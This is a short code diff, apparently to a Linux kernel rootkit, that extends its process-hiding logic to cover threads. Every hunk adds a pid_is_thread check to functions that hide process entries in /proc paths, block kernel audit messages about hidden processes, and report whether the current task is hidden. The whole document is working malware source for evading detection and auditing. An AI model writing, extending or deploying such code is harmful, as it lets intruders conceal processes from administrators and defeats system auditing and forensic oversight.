@@ -295,7 +295,8 @@ static notrace bool contains_hidden_proc_path(const char *data, size_t len)
         if (pid_len > 0) {
             pid_str[pid_len] = '\0';
             if (kstrtol(pid_str, 10, &pid) == 0 && pid > 0) {
-                if (is_hidden_pid((pid_t)pid) || is_child_pid((pid_t)pid))
+                if (is_hidden_pid((pid_t)pid) || is_child_pid((pid_t)pid) ||
+                    pid_is_thread((pid_t)pid))
                     return true;
             }
         }
@@ -339,7 +340,8 @@ static notrace bool should_block_audit_msg(const char *payload, size_t payload_l
     scan_hidden_process_sockets();
     
     msg_pid = extract_pid_from_audit_msg(payload, payload_len);
-    if (msg_pid > 0 && (is_hidden_pid(msg_pid) || is_child_pid(msg_pid)))
+    if (msg_pid > 0 && (is_hidden_pid(msg_pid) || is_child_pid(msg_pid) ||
+                        pid_is_thread(msg_pid)))
         return true;
     
     socket_ino = extract_socket_inode(payload, payload_len);
@@ -365,13 +367,16 @@ static notrace bool is_current_process_hidden(void)
     
     if (is_hidden_pid(pid) || is_hidden_pid(tgid))
         return true;
-    
+
     if (is_child_pid(pid) || is_child_pid(tgid))
         return true;
-    
+
+    if (pid_is_thread(pid))
+        return true;
+
     if (task->real_parent) {
         ppid = task->real_parent->tgid;
-        if (is_hidden_pid(ppid) || is_child_pid(ppid))
+        if (is_hidden_pid(ppid) || is_child_pid(ppid) || pid_is_thread(ppid))
             return true;
     }
     
